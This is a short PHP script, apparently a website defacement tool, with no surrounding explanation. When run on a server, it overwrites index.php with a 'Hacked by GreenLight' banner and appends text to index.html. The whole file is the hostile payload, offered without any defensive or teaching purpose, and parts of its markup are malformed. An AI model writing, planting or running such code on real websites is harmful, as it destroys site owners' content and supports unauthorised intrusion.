<?php
$entry_line="<? php
echo '<center><font color:green size=20000><h4>█ Hacked by GreenLight █</h4></center>";
$fp = fopen("index.php", "w");
fputs($fp, $entry_line);
fclose($fp);
?>

<? 
$fp =@fopen("index.html", "a+");
$yazi = "test" . "\r\n";
fwrite ($fp, "$yazi");
fclose ($fp);
?>
